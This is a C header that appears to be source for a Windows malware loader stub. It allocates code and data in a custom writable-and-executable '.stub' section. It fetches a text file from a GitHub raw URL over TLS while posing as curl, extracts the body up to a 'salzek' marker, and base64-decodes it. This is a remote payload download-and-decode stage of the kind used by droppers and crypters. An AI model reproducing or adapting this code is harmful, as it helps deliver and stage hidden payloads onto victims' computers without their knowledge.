#pragma once

#include <openssl/ssl.h>
#include <WS2tcpip.h>
#include <WinSock2.h>
#include <Windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>

#define RESPONSE_BUFFER_SIZE 8192
#define INCREASE_BUFFER		 4096

#pragma section(".stub", read, execute)
#pragma comment(linker, "/SECTION:.stub,ERW")

__declspec(allocate(".stub")) SSL* ssl = NULL;

__declspec(allocate(".stub")) SSL_CTX* ctx = NULL;

__declspec(allocate(".stub")) WSADATA d;

__declspec(allocate(".stub")) SOCKET sockt;

__declspec(allocate(".stub")) struct addrinfo hints = { 0 };

__declspec(allocate(".stub")) struct addrinfo* peer_address;

__declspec(allocate(".stub")) char hostname[] = "raw.githubusercontent.com";

__declspec(allocate(".stub")) int total_bytes_received = 0;

__declspec(allocate(".stub")) char host[100];
__declspec(allocate(".stub")) char serv[100];
__declspec(allocate(".stub")) char buffer[2048];
__declspec(allocate(".stub")) char *response_buffer = NULL;

__declspec(code_seg(".stub")) char* strstrn(const char* haystack, const char* needle) {
	if (!*needle) return (char*)haystack;

	for (const char* p1 = haystack; *p1; p1++) {
		if (*p1 != *needle) {
			continue;
		}

		const char* p1_adv = p1;
		const char* p2 = needle;
		while (*p1_adv && *p2 && *p1_adv == *p2) {
			p1_adv++;
			p2++;
		}

		if (!*p2) {
			return (char*)p1;
		}
	}

	return NULL;
}

void fetch_data() {
	HANDLE heap = GetProcessHeap();
	response_buffer = (char*)HeapAlloc(heap, HEAP_ZERO_MEMORY, RESPONSE_BUFFER_SIZE);
	int bytes_sent = SSL_write(ssl, buffer, strlen(buffer)), bytes_total_received = 0, control = 0, total_buffer_size = RESPONSE_BUFFER_SIZE;
	char* body = NULL;

	while(1){
		fd_set reads;
		FD_ZERO(&reads);
		FD_SET(sockt, &reads);

		struct timeval timeout;
		timeout.tv_sec = 0;
		timeout.tv_usec = 200;

		if (select(sockt + 1, &reads, 0, 0, &timeout) < 0) {
		}

		int bytes_received = SSL_read(ssl, response_buffer + bytes_total_received, 1024);

		if (body = strstrn(response_buffer, "\r\n\r\n")) {
			if (!control) {
				int fark = body - response_buffer;
				memcpy(response_buffer, response_buffer + fark, total_buffer_size - fark);
				bytes_total_received += bytes_received - fark;
				control = 1;
				continue;
			}
		}
		
		if (control) {
			bytes_total_received += bytes_received;
		}

		if (total_buffer_size - bytes_total_received <= 1024) {
			response_buffer = (char*)HeapReAlloc(heap, 0, response_buffer, total_buffer_size + INCREASE_BUFFER);
			total_buffer_size += INCREASE_BUFFER;
		}
			
		if (bytes_received < 1) {
			break;
		}
	}
}

void configure_SSL() {
	SSL_library_init();
	OpenSSL_add_all_algorithms();
	SSL_load_error_strings();

	ctx = SSL_CTX_new(TLS_client_method());

	ssl = SSL_new(ctx);
	
	if (!ctx) {
		//fprintf(stderr, "SSL_new() failed.\n");
	}
}

void cleanup_SSL_resources() {
	SSL_shutdown(ssl);
	SSL_free(ssl);
	SSL_CTX_free(ctx);
}

__declspec(code_seg(".stub")) void initialize_socket() {
	if (d.wVersion == 0)	WSAStartup(MAKEWORD(2, 2), &d);

	sockt = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	hints.ai_family = AF_INET;

}

__declspec(code_seg(".stub")) void handle_dns_lookup() {
	getaddrinfo(hostname, "443", &hints, &peer_address);

	getnameinfo(peer_address->ai_addr,
		peer_address->ai_addrlen,
		host, sizeof host,
		serv, sizeof serv,
		NI_NUMERICHOST | NI_NUMERICSERV);

}

__declspec(code_seg(".stub")) void construct_http_request() {
	wsprintf(buffer, "GET /salzek/test/main/test.txt HTTP/1.0\r\n");
	wsprintf(buffer + strlen(buffer), "Host: raw.githubusercontent.com\r\n");
	wsprintf(buffer + strlen(buffer), "User-Agent: curl/8.0.1\r\n");
	wsprintf(buffer + strlen(buffer), "Connection: close\r\n");
	wsprintf(buffer + strlen(buffer), "\r\n");

}

__declspec(code_seg(".stub")) void connect_server() {
	connect(sockt, peer_address->ai_addr, peer_address->ai_addrlen);
}

void connect_server_with_ssl() {
	SSL_set_fd(ssl, sockt);

	if (!SSL_set_tlsext_host_name(ssl, hostname)) {
		return 1;
	}

	if (SSL_connect(ssl) == -1) {
		return 1;
	}
}

__declspec(code_seg(".stub")) void closeSocket() {
	freeaddrinfo(peer_address);
	closesocket(sockt);
	WSACleanup();
}

__declspec(code_seg(".stub")) char* extract_http_body_content() {
	HANDLE heap = GetProcessHeap();

	char* body, *payload = NULL, *last;

		body = strstrn(response_buffer, "\r\n\r\n");
		body += 4;
		
		last = strstrn(body, "salzek");
		
		int fark = last - body;
		
		payload = HeapAlloc(GetProcessHeap(), 0, fark);;
		
		memcpy(payload, body, fark);
		
	return payload;
}

__declspec(allocate(".stub")) static char encoding_table[] = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
								'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
								'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
								'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
								'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
								'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
								'w', 'x', 'y', 'z', '0', '1', '2', '3',
								'4', '5', '6', '7', '8', '9', '+', '/' };

__declspec(allocate(".stub")) static char* decoding_table = NULL;

__declspec(allocate(".stub")) static int mod_table[] = { 0, 2, 1 };

__declspec(code_seg(".stub")) void build_decoding_table() {

	decoding_table = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 256);

	for (int i = 0; i < 64; i++)
		decoding_table[(unsigned char)encoding_table[i]] = i;
}

__declspec(code_seg(".stub")) char* base64_decode(const char* data, size_t input_length, DWORD* output_length) {
	if (decoding_table == NULL) build_decoding_table();

	if (input_length % 4 != 0) return NULL;

	*output_length = input_length / 4 * 3;
	if (data[input_length - 1] == '=') (*output_length)--;
	if (data[input_length - 2] == '=') (*output_length)--;

	unsigned char* decoded_data = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *output_length + 1);
	if (decoded_data == NULL) return NULL;

	for (int i = 0, j = 0; i < input_length;) {

		uint32_t sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
		uint32_t sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
		uint32_t sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
		uint32_t sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];

		uint32_t triple = (sextet_a << 3 * 6)
			+ (sextet_b << 2 * 6)
			+ (sextet_c << 1 * 6)
			+ (sextet_d << 0 * 6);

		if (j < *output_length) decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
		if (j < *output_length) decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
		if (j < *output_length) decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
	}

	decoded_data[*output_length] = '\0';

	return decoded_data;
}
